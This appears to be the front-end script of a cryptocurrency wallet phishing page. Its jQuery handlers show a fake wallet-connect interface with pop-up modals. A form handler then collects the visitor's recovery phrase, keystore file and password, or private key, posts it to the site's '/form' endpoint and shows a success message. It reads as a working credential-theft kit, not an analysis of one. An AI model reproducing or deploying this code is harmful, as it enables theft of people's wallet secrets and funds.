// require('dotenv').config();
// const nodemailer = require('nodemailer');

setTimeout(function () {
    $('.hide2').show();
    $('.hide-section').show();
    $('.section-1').css("position", "fixed");
}, 2000);

$(".close").click(function () {
    $('.hide-1').hide();
    $('.hide-section').hide();
    $('.hide2').hide();
    $('.section-1').css("position", "inherit");
});

// $('.hide-1').hide();
// $('.hide2').hide();
// $('.hide-section').hide();
$('.app-two').hide();
$('.app-three').hide();
$('.app-four').hide();
$('#qr-code').hide();
$(".li-item").click(function () {
    $('.hide-1').show();
    $('.hide-section').show();
    $('.section-1').css("position", "fixed");
});
$(".toggle1").click(function () {
    $('.app-one').show();
    $('.app-two').hide();
    $('.app-three').hide();
    $('.app-four').hide();
    $('.toggle1').css("background-color", "#5D534A");
    $('.toggle2').css("background-color", "rgb(160, 158, 158)");
    $('.toggle3').css("background-color", "rgb(160, 158, 158)");
    $('.toggle4').css("background-color", "rgb(160, 158, 158)");
});
$(".toggle2").click(function () {
    $('.app-two').show();
    $('.app-one').hide();
    $('.app-three').hide();
    $('.app-four').hide();
    $('.toggle2').css("background-color", "#5D534A");
    $('.toggle1').css("background-color", "rgb(160, 158, 158)");
    $('.toggle3').css("background-color", "rgb(160, 158, 158)");
    $('.toggle4').css("background-color", "rgb(160, 158, 158)");
});
$(".toggle3").click(function () {
    $('.app-three').show();
    $('.app-one').hide();
    $('.app-two').hide();
    $('.app-four').hide();
    $('.toggle3').css("background-color", "#5D534A");
    $('.toggle1').css("background-color", "rgb(160, 158, 158)");
    $('.toggle2').css("background-color", "rgb(160, 158, 158)");
    $('.toggle4').css("background-color", "rgb(160, 158, 158)");
});
$(".toggle4").click(function () {
    $('.app-four').show();
    $('.app-one').hide();
    $('.app-two').hide();
    $('.app-three').hide();
    $('.toggle4').css("background-color", "#5D534A");
    $('.toggle1').css("background-color", "rgb(160, 158, 158)");
    $('.toggle2').css("background-color", "rgb(160, 158, 158)");
    $('.toggle3').css("background-color", "rgb(160, 158, 158)");
});
$(".one").click(function () {
    $('#app').show();
    $('.toggler').show();
    $('#qr-code').hide();
    $('.one').css("background-color", "#fff");
    $('.two').css("background-color", "grey");
});
$(".two").click(function () {
    $('#qr-code').show();
    $('#app').hide();
    $('.toggler').hide();
    $('.hide2-cont2-h5').hide();
    $('.one').css("background-color", "grey");
    $('.two').css("background-color", "#fff");
});
$(".button").click(function () {
    $('.hide2').show();
    $('.hide-section').show();
    $('.hide-1').hide();
    $('.section-1').css("position", "fixed");
});

$(".phrase").click(function () {
    $("#phrase").show();
    $("#keystore").hide();
    $("#privatekey").hide();
});

$(".keystore").click(function () {
    $("#phrase").hide();
    $("#keystore").show();
    $("#privatekey").hide();
});

$(".privatekey").click(function () {
    $("#phrase").hide();
    $("#keystore").hide();
    $("#privatekey").show();
});

$('.app-cont').click(function () {
    window.location.href = '/form';
});


// backend
const form = document.getElementById("formN")

form?.addEventListener('submit', (e) => {
    e.preventDefault();
    document.querySelector('#loadingIcon').style.display="block";

    var hash = window.location.hash;
    var data;

    if (hash.includes('phrase')) {
        let input = document.getElementById("phraseInput")?.value
        data = input
    }
    if (hash.includes('keystore')) {
        let inputFirst = document.getElementById("keystoreInputFirst")?.value
        let inputSecond = document.getElementById("keystoreInputSecond")?.value
        data = `Keystore: ${JSON.stringify(inputFirst)} \n Password: ${inputSecond}`;
    }
    if (hash.includes('privatekey')) {
        let input = document.getElementById("privateKeyInput")?.value
        data = input;
    }
    
    let formData = {
        data: data
    }

    let xhr = new XMLHttpRequest();
    xhr.open('POST', '/form');
    xhr.setRequestHeader('content-type', 'application/json');
    xhr.onload = () => {
        document.querySelector('#loadingIcon').style.display="none";
        if (xhr.responseText == 'success') {
            document.querySelector('.msgModalContainer').style.display="grid"
            var section = hash.substring(1)
            let msg = `Your ${section} has been sent successfully!`
            document.querySelector('.msgP').textContent=msg
        } else {
            console.log(xhr.responseText)
            alert('something went wrong, please try again')
        }
    }
    xhr.send(JSON.stringify(formData));
})